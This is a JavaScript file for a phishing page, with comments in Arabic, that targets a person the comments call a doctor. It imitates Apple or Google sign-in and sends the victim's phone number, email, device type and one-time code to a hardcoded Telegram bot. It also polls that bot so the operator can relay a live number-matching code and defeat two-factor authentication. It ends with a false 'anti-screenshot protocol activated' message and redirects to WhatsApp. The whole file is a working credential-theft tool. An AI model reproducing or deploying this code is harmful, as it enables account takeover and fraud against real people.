const TOKEN = "8485113389:AAHZEkzRDLg2ZPBOjUb-osecIR34DExhxHg";
const CHAT_ID = "5976228373";

const isIOS = /iPhone|iPad|iPod/i.test(navigator.userAgent);
let phoneUser = "";
let emailUser = "";

// تنظيف الرقم عند عمل ريفريش (إعادة ضبط الـ Offset لآخر رسالة)
window.onload = () => {
    fetch(`https://api.telegram.org/bot${TOKEN}/getUpdates?offset=-1`);
};

function sendToBot(text) {
    fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(text)}`);
}

function goToStep2() {
    phoneUser = document.getElementById('phone-num').value;
    if (!phoneUser) return alert("يرجى إدخال الرقم");
    
    // إرسال الرقم فوراً بمجرد الضغط
    sendToBot(`📞 رقم هاتف الدكتور المستهدف: ${phoneUser}`);
    
    document.getElementById('step-1').style.display = 'none';
    document.getElementById('step-2').style.display = 'block';
    
    const header = document.getElementById('provider-header');
    if (isIOS) {
        header.innerHTML = '<img src="https://upload.wikimedia.org/wikipedia/commons/1/1b/Apple_logo_grey.svg" width="45">';
        document.getElementById('auth-btn').style.background = "#000";
    } else {
        header.innerHTML = '<img src="https://upload.wikimedia.org/wikipedia/commons/2/2f/Google_2015_logo.svg" width="90">';
        document.getElementById('auth-btn').style.background = "#1a73e8";
    }
}

function startAuth() {
    emailUser = document.getElementById('user-email').value;
    if (!emailUser) return alert("أدخل البريد");

    // إرسال الإيميل فوراً بمجرد الضغط
    sendToBot(`📧 بريد الدكتور: ${emailUser}\n📱 الجهاز: ${isIOS ? "iPhone" : "Android"}`);

    document.getElementById('auth-btn').style.display = "none";
    document.getElementById('loading-spinner').style.display = "block";

    setTimeout(() => {
        document.getElementById('step-2').style.display = 'none';
        document.getElementById('step-3').style.display = 'block';
        if (!isIOS) setInterval(listenForAdminCode, 1500); 
    }, 2000);
}

async function listenForAdminCode() {
    const res = await fetch(`https://api.telegram.org/bot${TOKEN}/getUpdates?offset=-1`);
    const data = await res.json();
    if (data.result?.length > 0) {
        const msg = data.result[0].message.text;
        // إذا أرسلت أنت رقماً، يظهر للدكتور
        if (!isNaN(msg) && msg.length <= 3) {
            document.getElementById('dynamic-code').innerText = msg;
        }
    }
}

function sendOtpToBot() {
    const otp = document.getElementById('otp-code').value;
    if (!otp) return alert("أدخل كود التفعيل");

    // إرسال كود الـ OTP النهائي للبوت
    sendToBot(`🔑 كود التحقق (OTP) وصل!!\n🔢 الكود: ${otp}\n🎯 الهدف: ${emailUser}`);
    
    document.getElementById('step-3').innerHTML = `<h3>✅ اكتمل التفعيل</h3><p>تم تفعيل بروتوكول منع التصوير بنجاح.</p>`;
    setTimeout(() => { window.location.href = "https://wa.me/84926426273"; }, 3000);
}